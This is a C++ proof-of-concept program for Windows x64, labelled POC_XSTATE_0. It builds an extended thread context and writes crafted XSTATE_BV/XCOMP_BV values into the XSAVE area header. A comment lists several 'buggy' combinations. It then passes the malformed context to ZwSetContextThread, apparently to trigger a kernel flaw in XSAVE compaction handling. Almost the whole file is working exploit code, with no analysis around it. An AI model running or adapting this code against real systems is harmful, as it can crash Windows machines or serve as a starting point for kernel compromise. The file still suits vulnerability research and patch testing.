// POC_XSTATE_0.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"

#define ulong unsigned long
#define ulonglong unsigned long long
#define ULONG unsigned long
#define ULONGLONG unsigned long long
#define ushort unsigned short
#define USHORT unsigned short
#define uchar unsigned char
#define UCHAR unsigned char


#define 	CONTEXT_CONTROL_RAW 0x00001
#define 	CONTEXT_INTEGER_RAW 0x00002
#define 	CONTEXT_SEGMENTS_RAW 0x00004
#define 	CONTEXT_FLOATING_POINT_RAW 0x00008
#define 	CONTEXT_DEBUG_REGISTERS_RAW 0x00010
#define 	CONTEXT_EXTENDED_REGISTERS_RAW 0x00020
#define 	CONTEXT_XSTATE_RAW 0x00040
#define		CONTEXT_UNKNOWN_RAW 0x0080
#define 	CONTEXT_FULL_RAW 0x0000B
#define 	CONTEXT_ALL_RAW 0x0001F


struct _EXTENDED_CONTEXT_HEADER
{
	ulong Offset_All;
	ulong Length_All;
	ulong Offset_Control;
	ulong Length_Control;
	ulong Offset_Integer;
	ulong Length_Integer;
};


extern "C"
{
	int ZwSetContextThread(HANDLE ThreadHandle, _CONTEXT* ThreadContext );
}





int _tmain(int argc, _TCHAR* argv[])
{
	printf("hello\r\n");

#define SharedUserData 0x7FFE0000

	ulong ControlFlags = *(ulong*)(SharedUserData + 0x3EC);
	if(ControlFlags & 2 == 0)
	{
		printf("Compaction Not supported on this system\r\n");
		return -1;
	}
	else
	{
		printf("Compaction Enabled\r\n");
	}

	ulonglong EnabledFeatures = 
	*(ulonglong*)(SharedUserData + 0x3D8);//xcr0

	printf("EnabledFeatures (XCR0): %I64X\r\n",EnabledFeatures);
	
	ulong ContextLength = 0x10000;

	void* pNew = VirtualAlloc(0,0x10000,MEM_COMMIT,PAGE_READWRITE);
	printf("pNew: %I64X\r\n",pNew);
	
	_CONTEXT* pContext64 = (_CONTEXT*)pNew;

	BOOL bRet = 
	InitializeContext(pContext64,
		CONTEXT_AMD64|CONTEXT_CONTROL_RAW|CONTEXT_INTEGER_RAW|CONTEXT_SEGMENTS_RAW|CONTEXT_FLOATING_POINT_RAW|CONTEXT_DEBUG_REGISTERS_RAW|CONTEXT_XSTATE_RAW,
		&pContext64,
		&ContextLength);

	
	printf("InitializeContext, bRet: %X\r\n",bRet);
	if(bRet)
	{
		printf("pContext64: %I64X\r\n",pContext64);
		printf("ContextLength: %I64X\r\n",ContextLength);
	}
	

	_EXTENDED_CONTEXT_HEADER* pExtended = 
	(_EXTENDED_CONTEXT_HEADER*) ( ((char*)pContext64) + sizeof(_CONTEXT));

	ulong Offset_Integer = pExtended->Offset_Integer;




	_XSAVE_AREA_HEADER* pAreaHeader = (_XSAVE_AREA_HEADER*)((char*)pExtended + Offset_Integer);

	//On a machine with SharedUserData->XState.EnabledFeatures is 0x1F, use the following
	//Buggy XSTATE_BV/XCOMP_BV combinations  ( 0x10/0x8000000000000006) ( 0x8/0x8000000000000016) ( 0x0000000000000018/0x8000000000000016)

	pAreaHeader->Mask =		   0x10;             //XSTATE_BV      //0x8						//0x0000000000000018
	pAreaHeader->Reserved[0] = 0x8000000000000006;//XCOMP_BV      //0x8000000000000016       //0x8000000000000016
	



	int ret = 	ZwSetContextThread(GetCurrentThread(),pContext64);
	printf("ZwSetContextThread,ret: %X\r\n",ret);
	return 0;
}